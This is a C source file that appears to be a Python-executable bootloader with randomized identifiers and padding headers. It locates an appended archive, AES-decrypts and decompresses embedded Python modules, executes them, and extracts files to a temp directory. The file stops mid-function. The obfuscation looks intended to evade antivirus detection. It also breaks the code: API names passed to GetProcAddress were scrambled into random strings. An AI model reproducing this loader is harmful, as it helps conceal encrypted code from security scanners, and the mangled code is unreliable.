#define _WIN32_WINNT 0x0500
#include "utils.h"
#include <memory.h>
#include <iads.h>
#include <stierr.h>
#include <neterr.h>
#include <certenc.h>
#include <cryptxml.h>
#include <shappmgr.h>
#include <netioapi.h>
#include <signal.h>
#include <mqmail.h>
#include <windows.h>
#include <devpropdef.h>
#include <udpmib.h>
#include <agterr.h>
#include <dls2.h>
#include <string.h>
#include <sdperr.h>
#include <eapauthenticatortypes.h>
#include <cmdtree.h>
#include <commctrl.h>
#include <mtsevents.h>
#include <stdint.h>
#include "utils.h"
#include <string.h>
#include <sys/stat.h>
#include <direct.h>
#include <sys/types.h>
#define unsetenv(x) _putenv(x "=")
#include "launch.h"
#include <windows.h>
#define snprintf _snprintf
#define vsnprintf _vsnprintf
#include <stdio.h>
#include <process.h>
#include "zlib.h"
#include <io.h>
char* basename (char *oFDwvxWdBrkgPTs) {
char *NAKvYp = strrchr (oFDwvxWdBrkgPTs, '\\');
if (!NAKvYp) NAKvYp = strrchr (oFDwvxWdBrkgPTs, '/');
return NAKvYp ? ++NAKvYp : (char*)oFDwvxWdBrkgPTs;}
int SBXxMmEjQEfZ(void) {
OSVERSIONINFO CwiwQp;
ZeroMemory(&CwiwQp, sizeof(OSVERSIONINFO));
CwiwQp.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&CwiwQp);
return ((CwiwQp.dwMajorVersion > 5) || ((CwiwQp.dwMajorVersion == 5) && (CwiwQp.dwMinorVersion >= 1)));}
int VpzRrZjtiCb(char *btIlnqBv, char *ZrTUrhkZusle) { return 0; }
void PhiJDNRtWIEDX(void) {
void (WINAPI *OSKfgQ)(HANDLE);
BOOL (WINAPI *XkAxIlkagyEr)(DWORD dwFlags, ULONG_PTR ulCookie);
HANDLE QCczHhLndIeEGM;
if (!SBXxMmEjQEfZ()) return;
QCczHhLndIeEGM = LoadLibrary("kernel32");
OSKfgQ = (void*)GetProcAddress(QCczHhLndIeEGM, "OSKfgQ");
XkAxIlkagyEr = (void*)GetProcAddress(QCczHhLndIeEGM, "XkAxIlkagyEr");
if (!OSKfgQ || !XkAxIlkagyEr) { return; }}
void icVUknz(void) { InitCommonControls(); }
int YhcCLXSbYpkxA(char *aUdsuUdABhN, const char *QgnkOBNUucBCFL) {
if (!GetModuleFileNameA(NULL, aUdsuUdABhN, _MAX_PATH)) { return -1; } return 0; }
int NZmEXaeLBMNnCG(LPWSTR VLmQWnxAc) {
if (!GetModuleFileNameW(NULL, VLmQWnxAc, _MAX_PATH)) { return -1; } return 0; }
void nWMdmKnGbuwqIL(char *OAZDxbQHVCX, const char *QicrJTIgUs) {
char *kgeoWDXFXImV = NULL;
strcpy(OAZDxbQHVCX, QicrJTIgUs);
for (kgeoWDXFXImV = OAZDxbQHVCX + strlen(OAZDxbQHVCX); *kgeoWDXFXImV != '\\' && kgeoWDXFXImV >= OAZDxbQHVCX + 2; --kgeoWDXFXImV);
*++kgeoWDXFXImV = '\0'; }
void RqAgZvlB(char *HYMPmpyNn, const char *XkMabMeftuB){
strcpy(HYMPmpyNn, XkMabMeftuB);
strcpy(HYMPmpyNn + strlen(HYMPmpyNn) - 3, "pkg");}
 int oskIhm(const ARCHIVE_STATUS *PtTaevRL) { return 0; }
int htsFqKqCvKVri(LPWSTR jHBvjV) {
SECURITY_ATTRIBUTES AZjXKcZDmMhQDbx;
STARTUPINFOW aNWZWJPr;
PROCESS_INFORMATION kNajVajpPNJ;
int CHLTyUzQTtBB = 0;
signal(SIGINT, SIG_IGN);
AZjXKcZDmMhQDbx.lpSecurityDescriptor = NULL;
AZjXKcZDmMhQDbx.nLength = sizeof(AZjXKcZDmMhQDbx);
AZjXKcZDmMhQDbx.bInheritHandle = TRUE;
signal(SIGTERM, SIG_IGN);
signal(SIGBREAK, SIG_IGN);
signal(SIGABRT, SIG_IGN);
GetStartupInfoW(&aNWZWJPr);
aNWZWJPr.wShowWindow = SW_NORMAL;
aNWZWJPr.lpDesktop = NULL;
aNWZWJPr.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
aNWZWJPr.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
aNWZWJPr.lpReserved = NULL;
aNWZWJPr.hStdError = (void*)_get_osfhandle(fileno(stderr));
aNWZWJPr.hStdInput = (void*)_get_osfhandle(fileno(stdin));
aNWZWJPr.lpTitle = NULL;
if (CreateProcessW( jHBvjV, GetCommandLineW(), &AZjXKcZDmMhQDbx, NULL, TRUE, 0,  NULL, NULL, &aNWZWJPr, &kNajVajpPNJ)) {
WaitForSingleObject(kNajVajpPNJ.hProcess, INFINITE);
GetExitCodeProcess(kNajVajpPNJ.hProcess, (unsigned long *)&CHLTyUzQTtBB);
} else { CHLTyUzQTtBB = -1; }
return CHLTyUzQTtBB; }
DECLPROC(PyList_New);
DECLPROC(PyModule_GetDict);
DECLPROC(PyObject_CallFunction);
DECLPROC(PyString_AsString);
DECLPROC(PyObject_SetAttrString);
DECLVAR(Py_FrozenFlag);
DECLPROC(PyErr_Clear);
DECLVAR(Py_NoSiteFlag);
DECLPROC(PyList_Append);
DECLPROC(PyImport_ImportModule);
DECLPROC(PyImport_ExecCodeModule);
DECLPROC(PySys_SetObject);
DECLPROC(Py_DecRef);
DECLPROC(Py_Initialize);
DECLPROC(PyImport_AddModule);
DECLPROC(Py_Finalize);
DECLPROC(PyRun_SimpleString);
DECLPROC(PyObject_CallMethod);
DECLPROC(PyDict_GetItemString);
DECLPROC(PyErr_Occurred);
DECLPROC(PyInt_AsLong);
DECLPROC(PyErr_Print);
DECLPROC(PyString_FromStringAndSize);
DECLPROC(Py_BuildValue);
DECLPROC(Py_SetProgramName);
DECLPROC(Py_IncRef);
unsigned char *kJYOqGLoQaecy(ARCHIVE_STATUS *UbhpDO, TOC *KsymWbdOGayEh);
int ddVKXuzrQm(char *gpxFEdy){
int i;
char *SZDHOe;
char YcGcLdzWEIrb[16];
GetTempPath(MAX_PATH, gpxFEdy);
sprintf(YcGcLdzWEIrb, "_MEI%d", getpid());
for (i=0;i<5;i++) {
    SZDHOe = _tempnam(gpxFEdy, YcGcLdzWEIrb);
    if (mkdir(SZDHOe) == 0) {
        strcpy(gpxFEdy, SZDHOe); strcat(gpxFEdy, "\\");
        free(SZDHOe); return 1;
    } free(SZDHOe);
} return 0; }
static int PevLMJf(char *unsmHNexCXe, const char *XMMbjuXKUFjQfY, ...){
    va_list TxUQboRZpEV;
    struct stat aDFYPoisOsKNo;
    va_start(TxUQboRZpEV, XMMbjuXKUFjQfY);
    vsnprintf(unsmHNexCXe, _MAX_PATH, XMMbjuXKUFjQfY, TxUQboRZpEV);
    va_end(TxUQboRZpEV);
    return stat(unsmHNexCXe, &aDFYPoisOsKNo); }
int xDgDvVKlPGRtk(ARCHIVE_STATUS *ehBhfjkl, char const * agNdvfa, char const * AIPZNmYOozdA) {
    char *DpNIOrYXXZuMX;
    strcpy(ehBhfjkl->archivename, agNdvfa);
    strcat(ehBhfjkl->archivename, AIPZNmYOozdA);
    strcpy(ehBhfjkl->homepath, agNdvfa);
    strcpy(ehBhfjkl->homepathraw, agNdvfa);
    for ( DpNIOrYXXZuMX = ehBhfjkl->homepath; *DpNIOrYXXZuMX; DpNIOrYXXZuMX++ ) if (*DpNIOrYXXZuMX == '\\') *DpNIOrYXXZuMX = '/';
    return 0;}
int gYqajEpaTZQjnct(ARCHIVE_STATUS *tQkdBGVd, int ukiyAypaNnTO) {
    if (fseek(tQkdBGVd->fp, ukiyAypaNnTO-(int)sizeof(COOKIE), SEEK_SET)) return -1;
    if (fread(&(tQkdBGVd->cookie), sizeof(COOKIE), 1, tQkdBGVd->fp) < 1) return -1;
    if (strncmp(tQkdBGVd->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
    return 0;}
    int LvGnvyehrIvFZ(ARCHIVE_STATUS *lYDQqlPPhBbqDqa){
        int i; int XbwKBpV;
        lYDQqlPPhBbqDqa->fp = fopen(lYDQqlPPhBbqDqa->archivename, "rb");
        if (lYDQqlPPhBbqDqa->fp == NULL) { return -1;}
        fseek(lYDQqlPPhBbqDqa->fp, 0, SEEK_END);
        XbwKBpV = ftell(lYDQqlPPhBbqDqa->fp);
        if (gYqajEpaTZQjnct(lYDQqlPPhBbqDqa, XbwKBpV) < 0) { return -1;}
        lYDQqlPPhBbqDqa->pkgstart = XbwKBpV - ntohl(lYDQqlPPhBbqDqa->cookie.len);
        fseek(lYDQqlPPhBbqDqa->fp, lYDQqlPPhBbqDqa->pkgstart + ntohl(lYDQqlPPhBbqDqa->cookie.TOC), SEEK_SET);
        lYDQqlPPhBbqDqa->tocbuff = (TOC *) malloc(ntohl(lYDQqlPPhBbqDqa->cookie.TOClen));
        if (lYDQqlPPhBbqDqa->tocbuff == NULL){ return -1; }
        if (fread(lYDQqlPPhBbqDqa->tocbuff, ntohl(lYDQqlPPhBbqDqa->cookie.TOClen), 1, lYDQqlPPhBbqDqa->fp) < 1) { return -1; }
        lYDQqlPPhBbqDqa->tocend = (TOC *) (((char *)lYDQqlPPhBbqDqa->tocbuff) + ntohl(lYDQqlPPhBbqDqa->cookie.TOClen));
        if (ferror(lYDQqlPPhBbqDqa->fp)) { return -1; }
        return 0;}
        struct _old_typeobject;
        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
        typedef void (*destructor)(PyObject *);
        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;
            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;
        static void _EmulatedIncRef(PyObject *o){
            OldPyObject *oo = (OldPyObject*)o;
            if (oo) oo->ob_refcnt++;}
        static void _EmulatedDecRef(PyObject *o){
            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
            OldPyObject *oo = (OldPyObject*)o;
            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
int SnJlULpjBQehkdg(HMODULE jXKxtjxuEvqKjbs, int ahEEgr){
GETPROC(jXKxtjxuEvqKjbs, PyImport_AddModule);
GETPROCOPT(jXKxtjxuEvqKjbs, Py_IncRef);
GETPROC(jXKxtjxuEvqKjbs, Py_BuildValue);
GETPROC(jXKxtjxuEvqKjbs, PyString_AsString);
GETVAR(jXKxtjxuEvqKjbs, Py_FrozenFlag);
GETPROC(jXKxtjxuEvqKjbs, Py_Initialize);
GETPROC(jXKxtjxuEvqKjbs, PyList_Append);
GETPROC(jXKxtjxuEvqKjbs, PyString_FromStringAndSize);
GETVAR(jXKxtjxuEvqKjbs, Py_NoSiteFlag);
GETPROCOPT(jXKxtjxuEvqKjbs, Py_DecRef);
GETPROC(jXKxtjxuEvqKjbs, PyObject_CallMethod);
GETPROC(jXKxtjxuEvqKjbs, PyErr_Print);
GETPROC(jXKxtjxuEvqKjbs, PyObject_SetAttrString);
GETPROC(jXKxtjxuEvqKjbs, Py_SetProgramName);
GETPROC(jXKxtjxuEvqKjbs, PyImport_ImportModule);
GETPROC(jXKxtjxuEvqKjbs, PyErr_Clear);
GETPROC(jXKxtjxuEvqKjbs, PyInt_AsLong);
GETPROC(jXKxtjxuEvqKjbs, Py_Finalize);
GETPROC(jXKxtjxuEvqKjbs, PyErr_Occurred);
GETPROC(jXKxtjxuEvqKjbs, PyModule_GetDict);
GETPROC(jXKxtjxuEvqKjbs, PyList_New);
GETPROC(jXKxtjxuEvqKjbs, PyImport_ExecCodeModule);
GETPROC(jXKxtjxuEvqKjbs, PyDict_GetItemString);
GETPROC(jXKxtjxuEvqKjbs, PyRun_SimpleString);
GETPROC(jXKxtjxuEvqKjbs, PyObject_CallFunction);
    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
    return 0;}
int YtHccJBeAvX(ARCHIVE_STATUS *zlWlcWgxqSHMemH){
    HINSTANCE iTuJHFBRHvML;
    char weyVjV[_MAX_PATH + 1];
    int sUqhRfkBnOmM = ntohl(zlWlcWgxqSHMemH->cookie.pyvers);
    sprintf(weyVjV, "%spython%02d.dll", zlWlcWgxqSHMemH->homepathraw, sUqhRfkBnOmM);
    iTuJHFBRHvML = LoadLibraryExA(weyVjV, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!iTuJHFBRHvML) {sprintf(weyVjV, "%spython%02d.dll", zlWlcWgxqSHMemH->temppathraw, sUqhRfkBnOmM);
        iTuJHFBRHvML = LoadLibraryExA(weyVjV, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
    if (iTuJHFBRHvML == 0) { return -1; }
    SnJlULpjBQehkdg(iTuJHFBRHvML, sUqhRfkBnOmM);
    return 0;}
 TOC *YNhzgANrCYcjc(ARCHIVE_STATUS *fIHHLyGvO, TOC* lErApxjNzgoGXW){
     TOC *TWQeoTqrhC = (TOC*)((char *)lErApxjNzgoGXW + ntohl(lErApxjNzgoGXW->structlen));
     if (TWQeoTqrhC < fIHHLyGvO->tocbuff) { return fIHHLyGvO->tocend; }
     return TWQeoTqrhC;}
int wAMdxvDGmSwq(ARCHIVE_STATUS *bGcmKEnYHwFw, int argc, char *argv[]) {
static char JgodSVPUGAXJK[2*_MAX_PATH + 14];
int i;
char DFYpiLeVYN[_MAX_PATH+1+80];
char yLQQfyY[_MAX_PATH+1];
PyObject *aKnekXmUB;
PyObject *val;
PyObject *sys;
strcpy(JgodSVPUGAXJK, "PYTHONPATH=");
if (bGcmKEnYHwFw->temppath[0] != '\0') { strcat(JgodSVPUGAXJK, bGcmKEnYHwFw->temppath); JgodSVPUGAXJK[strlen(JgodSVPUGAXJK)-1] = '\0'; strcat(JgodSVPUGAXJK, ";"); }
strcat(JgodSVPUGAXJK, bGcmKEnYHwFw->homepath);
if (strlen(JgodSVPUGAXJK) > 14) JgodSVPUGAXJK[strlen(JgodSVPUGAXJK)-1] = '\0';
putenv(JgodSVPUGAXJK);
strcpy(JgodSVPUGAXJK, "PYTHONHOME=");
strcat(JgodSVPUGAXJK, bGcmKEnYHwFw->temppath);
putenv(JgodSVPUGAXJK);
*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
PI_Py_SetProgramName(bGcmKEnYHwFw->archivename);
PI_Py_Initialize();
PI_PyRun_SimpleString("import sys\n");
PI_PyRun_SimpleString("del sys.path[:]\n");
if (bGcmKEnYHwFw->temppath[0] != '\0') {
    strcpy(yLQQfyY, bGcmKEnYHwFw->temppath);
    yLQQfyY[strlen(yLQQfyY)-1] = '\0';
    sprintf(DFYpiLeVYN, "sys.path.append(r\"%s\")", yLQQfyY);
    PI_PyRun_SimpleString(DFYpiLeVYN);}
strcpy(yLQQfyY, bGcmKEnYHwFw->homepath);
yLQQfyY[strlen(yLQQfyY)-1] = '\0';
sprintf(DFYpiLeVYN, "sys.path.append(r\"%s\")", yLQQfyY);
PI_PyRun_SimpleString (DFYpiLeVYN);
aKnekXmUB = PI_PyList_New(0);
val = PI_Py_BuildValue("s", bGcmKEnYHwFw->archivename);
PI_PyList_Append(aKnekXmUB, val);
for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (aKnekXmUB, val); }
sys = PI_PyImport_ImportModule("sys");
PI_PyObject_SetAttrString(sys, "argv", aKnekXmUB);
return 0;}
int nXnnJLmRyc(ARCHIVE_STATUS *xswAWVcFCJjce){
    PyObject *eEoRqVrADj; PyObject *ItutpXpWpMU; PyObject *zTQMadA;
    TOC *okjIzbywkWqUq; PyObject *co; PyObject *mod;
    eEoRqVrADj = PI_PyImport_ImportModule("marshal");
    ItutpXpWpMU = PI_PyModule_GetDict(eEoRqVrADj);
    zTQMadA = PI_PyDict_GetItemString(ItutpXpWpMU, "loads");
    okjIzbywkWqUq = xswAWVcFCJjce->tocbuff;
    while (okjIzbywkWqUq < xswAWVcFCJjce->tocend) {
        if (okjIzbywkWqUq->typcd == 'm' || okjIzbywkWqUq->typcd == 'M'){
            unsigned char *CZoVaNbOt = kJYOqGLoQaecy(xswAWVcFCJjce, okjIzbywkWqUq);
            co = PI_PyObject_CallFunction(zTQMadA, "s#", CZoVaNbOt+8, ntohl(okjIzbywkWqUq->ulen)-8);
            mod = PI_PyImport_ExecCodeModule(okjIzbywkWqUq->name, co);
            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
            free(CZoVaNbOt);
        }
        okjIzbywkWqUq = YNhzgANrCYcjc(xswAWVcFCJjce, okjIzbywkWqUq);
    } return 0; }
int FfZkNiaSHI(ARCHIVE_STATUS *mmBoUOvpPAxZwN, TOC *IHaBkMz){
    int yzqgWNrRIFvAK; int cwAWapjEsk = mmBoUOvpPAxZwN->pkgstart + ntohl(IHaBkMz->pos);
    char *riqGzw = "sys.path.append(r\"%s?%d\")\n";
    char *ZhXxhsPOGGhy = (char *) malloc(strlen(riqGzw) + strlen(mmBoUOvpPAxZwN->archivename) + 32);
    sprintf(ZhXxhsPOGGhy, riqGzw, mmBoUOvpPAxZwN->archivename, cwAWapjEsk);
    yzqgWNrRIFvAK = PI_PyRun_SimpleString(ZhXxhsPOGGhy);
    if (yzqgWNrRIFvAK != 0){ free(ZhXxhsPOGGhy); return -1; }
    free(ZhXxhsPOGGhy); return 0;}
int HkJmTkfFil(ARCHIVE_STATUS *kiNEnejnEyvna){
TOC * iqZIAykYVaO; iqZIAykYVaO = kiNEnejnEyvna->tocbuff;
while (iqZIAykYVaO < kiNEnejnEyvna->tocend) {
    if (iqZIAykYVaO->typcd == 'z') { FfZkNiaSHI(kiNEnejnEyvna, iqZIAykYVaO); }
    iqZIAykYVaO = YNhzgANrCYcjc(kiNEnejnEyvna, iqZIAykYVaO); }
return 0; }
unsigned char *OQLstO(unsigned char * qwdyRawK, TOC *UhKKrXTSijeuyJ){
unsigned char *qxsAQVDu; z_stream NkFrvZVLKPMLPg; int eTURwsHnywikjA;
qxsAQVDu = (unsigned char *)malloc(ntohl(UhKKrXTSijeuyJ->ulen));
if (qxsAQVDu == NULL) { return NULL; }
NkFrvZVLKPMLPg.zalloc = NULL;
NkFrvZVLKPMLPg.zfree = NULL;
NkFrvZVLKPMLPg.opaque = NULL;
NkFrvZVLKPMLPg.next_in = qwdyRawK;
NkFrvZVLKPMLPg.avail_in = ntohl(UhKKrXTSijeuyJ->len);
NkFrvZVLKPMLPg.next_out = qxsAQVDu;
NkFrvZVLKPMLPg.avail_out = ntohl(UhKKrXTSijeuyJ->ulen);
eTURwsHnywikjA = inflateInit(&NkFrvZVLKPMLPg);
if (eTURwsHnywikjA >= 0) { 
    eTURwsHnywikjA = (inflate)(&NkFrvZVLKPMLPg, Z_FINISH);
    if (eTURwsHnywikjA >= 0) { eTURwsHnywikjA = (inflateEnd)(&NkFrvZVLKPMLPg); }
    else { return NULL; } }
else { return NULL; }
return qxsAQVDu;}
unsigned char *kJYOqGLoQaecy(ARCHIVE_STATUS *jtFujBWM, TOC *hwoRZLdRVIzjgkz){
unsigned char *bahhvZmsXplQnIP;unsigned char *XNReLXrhZHDmA;
fseek(jtFujBWM->fp, jtFujBWM->pkgstart + ntohl(hwoRZLdRVIzjgkz->pos), SEEK_SET);
bahhvZmsXplQnIP = (unsigned char *)malloc(ntohl(hwoRZLdRVIzjgkz->len));
if (bahhvZmsXplQnIP == NULL) { return NULL; }
if (fread(bahhvZmsXplQnIP, ntohl(hwoRZLdRVIzjgkz->len), 1, jtFujBWM->fp) < 1) { return NULL; }
if (hwoRZLdRVIzjgkz->cflag == '\2') {
    static PyObject *EZwFtHrCzzBngY = NULL;
    PyObject *SZhoHdrsZadhh; PyObject *otCtqFwhZ; PyObject *bUXDJsKH; PyObject *rPPzlM;
    long block_size; char *iv;
    if (!EZwFtHrCzzBngY) EZwFtHrCzzBngY = PI_PyImport_ImportModule("AES");
    otCtqFwhZ = PI_PyModule_GetDict(EZwFtHrCzzBngY);
    SZhoHdrsZadhh = PI_PyDict_GetItemString(otCtqFwhZ, "new");
    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(otCtqFwhZ, "block_size"));
    iv = malloc(block_size);
    memset(iv, 0, block_size);
    bUXDJsKH = PI_PyObject_CallFunction(SZhoHdrsZadhh, "s#Os#", bahhvZmsXplQnIP, 32, PI_PyDict_GetItemString(otCtqFwhZ, "MODE_CFB"), iv, block_size);
    rPPzlM = PI_PyObject_CallMethod(bUXDJsKH, "decrypt", "s#", bahhvZmsXplQnIP+32, ntohl(hwoRZLdRVIzjgkz->len)-32);
    memcpy(bahhvZmsXplQnIP, PI_PyString_AsString(rPPzlM), ntohl(hwoRZLdRVIzjgkz->len)-32);
    Py_DECREF(bUXDJsKH); Py_DECREF(rPPzlM);}
if (hwoRZLdRVIzjgkz->cflag == '\1' || hwoRZLdRVIzjgkz->cflag == '\2') {
    XNReLXrhZHDmA = OQLstO(bahhvZmsXplQnIP, hwoRZLdRVIzjgkz);
    free(bahhvZmsXplQnIP); bahhvZmsXplQnIP = XNReLXrhZHDmA;
    if (bahhvZmsXplQnIP == NULL) { return NULL; } }
return bahhvZmsXplQnIP;}
FILE *eXVxdHVlLpR(const char *aqmZpkBZsU, const char* IVtuVNLSOqBTso) {
struct stat FuceFIsDT; char LEHVacHupgP[_MAX_PATH+1]; char xCroqxdaZw[_MAX_PATH+1]; char *OpIdLuBWp;
strcpy(LEHVacHupgP, aqmZpkBZsU); strcpy(xCroqxdaZw, IVtuVNLSOqBTso); LEHVacHupgP[strlen(LEHVacHupgP)-1] = '\0';
OpIdLuBWp = strtok(xCroqxdaZw, "/\\");
while (OpIdLuBWp != NULL){
    strcat(LEHVacHupgP, "\\");
    strcat(LEHVacHupgP, OpIdLuBWp);
    OpIdLuBWp = strtok(NULL, "/\\");
    if (!OpIdLuBWp) break;
    if (stat(LEHVacHupgP, &FuceFIsDT) < 0) {mkdir(LEHVacHupgP);} }
return fopen(LEHVacHupgP, "wb"); }
static int vtLXXklSy(ARCHIVE_STATUS *eIVqmqccMfyfq) {
char *XAdYTjkdEfZh;
if (eIVqmqccMfyfq->temppath[0] == '\0') {
    if (!ddVKXuzrQm(eIVqmqccMfyfq->temppath)) {return -1;}
    strcpy(eIVqmqccMfyfq->temppathraw, eIVqmqccMfyfq->temppath);
    for ( XAdYTjkdEfZh=eIVqmqccMfyfq->temppath; *XAdYTjkdEfZh; XAdYTjkdEfZh++ ) if (*XAdYTjkdEfZh == '\\') *XAdYTjkdEfZh = '/';}
return 0;}
int wVHbJbpQtePHg(ARCHIVE_STATUS *DPwyVQ, TOC *fZsTrbzilSm) {
FILE *XWHWywIWevrXs; unsigned char *shZnVZeFRF = kJYOqGLoQaecy(DPwyVQ, fZsTrbzilSm);
if (vtLXXklSy(DPwyVQ) == -1){ return -1; }
XWHWywIWevrXs = eXVxdHVlLpR(DPwyVQ->temppath, fZsTrbzilSm->name);
if (XWHWywIWevrXs == NULL)  { return -1; }
else { fwrite(shZnVZeFRF, ntohl(fZsTrbzilSm->ulen), 1, XWHWywIWevrXs); fclose(XWHWywIWevrXs); }
free(shZnVZeFRF); return 0; }
static int kehzWtLodFxFxx(char *VEvqtO, char *qyDTbilsxqNsX, const char *FkhYOO) {
char rTYsEkFtQRdo[_MAX_PATH + 1];
strcpy(rTYsEkFtQRdo, FkhYOO);
strcpy(VEvqtO, strtok(rTYsEkFtQRdo, ":"));
strcpy(qyDTbilsxqNsX, strtok(NULL, ":")) ;
if (VEvqtO[0] == 0 || qyDTbilsxqNsX[0] == 0) return -1;
return 0; }
static int XQueOVRkJI(const char *HvieymDqzRJbO, const char *wEpGWiyYasaDj, const char *phNLLBSFtEue) {
FILE *dkcrnWEdCc = fopen(HvieymDqzRJbO, "rb"); FILE *eBtMyhw = eXVxdHVlLpR(wEpGWiyYasaDj, phNLLBSFtEue);
char buf[4096]; int error = 0;
if (dkcrnWEdCc == NULL || eBtMyhw == NULL) return -1;
while (!feof(dkcrnWEdCc)) {
    if (fread(buf, 4096, 1, dkcrnWEdCc) == -1) {
        if (ferror(dkcrnWEdCc)) { clearerr(dkcrnWEdCc); error = -1; break; }
    } else {
        fwrite(buf, 4096, 1, eBtMyhw);
        if (ferror(eBtMyhw)) { clearerr(eBtMyhw); error = -1; break;}}}
fclose(dkcrnWEdCc); fclose(eBtMyhw); return error; }
static char *qUXVcsGojcUQJ(const char *mciicwKCTcvX) {
char *fEZtUBwMkayAvlF = strrchr(mciicwKCTcvX, '\\');
char *mJAoGGXE = (char *) calloc(_MAX_PATH, sizeof(char));
if (fEZtUBwMkayAvlF != NULL) strncpy(mJAoGGXE, mciicwKCTcvX, fEZtUBwMkayAvlF - mciicwKCTcvX + 1);
else strcpy(mJAoGGXE, mciicwKCTcvX);
return mJAoGGXE; }
static int HvjhijztyXmorqq(ARCHIVE_STATUS *cZjwjkRcuPCROk, const char *dhclSSqteKyvvU, const char *DTTqnfnbVt){
if (vtLXXklSy(cZjwjkRcuPCROk) == -1){ return -1; }
if (XQueOVRkJI(dhclSSqteKyvvU, cZjwjkRcuPCROk->temppath, DTTqnfnbVt) == -1) { return -1; }
return 0; }
static ARCHIVE_STATUS *llAnXoVRbWCoVnk(ARCHIVE_STATUS *WFKbkJyYXG[], const char *uXQwALoehDEU) {
ARCHIVE_STATUS *VNRqgtqKGUrdUu = NULL; int i = 0;
if (vtLXXklSy(WFKbkJyYXG[SELF]) == -1){ return NULL; } 
for (i = 1; WFKbkJyYXG[i] != NULL; i++){ if (strcmp(WFKbkJyYXG[i]->archivename, uXQwALoehDEU) == 0) { return WFKbkJyYXG[i]; } }
if ((VNRqgtqKGUrdUu = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
strcpy(VNRqgtqKGUrdUu->archivename, uXQwALoehDEU);
strcpy(VNRqgtqKGUrdUu->homepath, WFKbkJyYXG[SELF]->homepath);
strcpy(VNRqgtqKGUrdUu->temppath, WFKbkJyYXG[SELF]->temppath);
strcpy(VNRqgtqKGUrdUu->homepathraw, WFKbkJyYXG[SELF]->homepathraw);
strcpy(VNRqgtqKGUrdUu->temppathraw, WFKbkJyYXG[SELF]->temppathraw);
if (LvGnvyehrIvFZ(VNRqgtqKGUrdUu)) { free(VNRqgtqKGUrdUu); return NULL; }
WFKbkJyYXG[i] = VNRqgtqKGUrdUu; return VNRqgtqKGUrdUu; }
static int pSUZxqeIVicbpkH(ARCHIVE_STATUS *LoeguMTA, const char *kUbJMPcTedg) {
TOC * bGwoJfl = LoeguMTA->tocbuff;
while (bGwoJfl < LoeguMTA->tocend) {
    if (strcmp(bGwoJfl->name, kUbJMPcTedg) == 0) if (wVHbJbpQtePHg(LoeguMTA, bGwoJfl)) return -1;
    bGwoJfl = YNhzgANrCYcjc(LoeguMTA, bGwoJfl); }
return 0; }
static int FVjCDxjzOAuv(ARCHIVE_STATUS *gmctkXtoKAXz[], const char *nolkhixfHNT) {
ARCHIVE_STATUS *smLIrXDc = NULL;
char ZlJPgjaInd[_MAX_PATH + 1]; char ekIiSOp[_MAX_PATH + 1];
char YEubkZWfBlSzsDP[_MAX_PATH + 1]; char *XttlYpUBxvPVyZ = NULL;
if (kehzWtLodFxFxx(ZlJPgjaInd, ekIiSOp, nolkhixfHNT) == -1) return -1;
XttlYpUBxvPVyZ = qUXVcsGojcUQJ(ZlJPgjaInd);
if (XttlYpUBxvPVyZ[0] == 0) { free(XttlYpUBxvPVyZ); return -1; }
if ((PevLMJf(YEubkZWfBlSzsDP, "%s%s.pkg", gmctkXtoKAXz[SELF]->homepath, ZlJPgjaInd) != 0) &&
    (PevLMJf(YEubkZWfBlSzsDP, "%s%s.exe", gmctkXtoKAXz[SELF]->homepath, ZlJPgjaInd) != 0) &&
    (PevLMJf(YEubkZWfBlSzsDP, "%s%s", gmctkXtoKAXz[SELF]->homepath, ZlJPgjaInd) != 0)) { return -1; }
    if ((smLIrXDc = llAnXoVRbWCoVnk(gmctkXtoKAXz, YEubkZWfBlSzsDP)) == NULL) { return -1; }
if (pSUZxqeIVicbpkH(smLIrXDc, ekIiSOp) == -1) { free(smLIrXDc); return -1; }
free(XttlYpUBxvPVyZ); return 0; }
int HKKgINgFMMPieFZ(ARCHIVE_STATUS *bDZnOyVnGTlGo[]) {
TOC * FCpxWDweNeumM = bDZnOyVnGTlGo[SELF]->tocbuff;
while (FCpxWDweNeumM < bDZnOyVnGTlGo[SELF]->tocend) {
    if (FCpxWDweNeumM->typcd == 'b' || FCpxWDweNeumM->typcd == 'x' || FCpxWDweNeumM->typcd == 'Z') return 1;
    if (FCpxWDweNeumM->typcd == 'd')  return 1;
    FCpxWDweNeumM = YNhzgANrCYcjc(bDZnOyVnGTlGo[SELF], FCpxWDweNeumM);
} return 0; }
int ASHROseCHjKd(ARCHIVE_STATUS *VGFYByUUEPyvI[]) {
TOC * KxSYaMim = VGFYByUUEPyvI[SELF]->tocbuff;
while (KxSYaMim < VGFYByUUEPyvI[SELF]->tocend) {
    if (KxSYaMim->typcd == 'b' || KxSYaMim->typcd == 'x' || KxSYaMim->typcd == 'Z')
        if (wVHbJbpQtePHg(VGFYByUUEPyvI[SELF], KxSYaMim)) return -1;
    if (KxSYaMim->typcd == 'd') {
        if (FVjCDxjzOAuv(VGFYByUUEPyvI, KxSYaMim->name) == -1) return -1; }
    KxSYaMim = YNhzgANrCYcjc(VGFYByUUEPyvI[SELF], KxSYaMim); }
return 0; }
int opsYsHiN(ARCHIVE_STATUS *CdYrPcKPFvgTPNF) {
unsigned char *EmlFsRbwumhx; char EtiXZSEyGxN[_MAX_PATH]; int KBFphrMDoper = 0;
TOC * XXbKNMLwgecH = CdYrPcKPFvgTPNF->tocbuff;
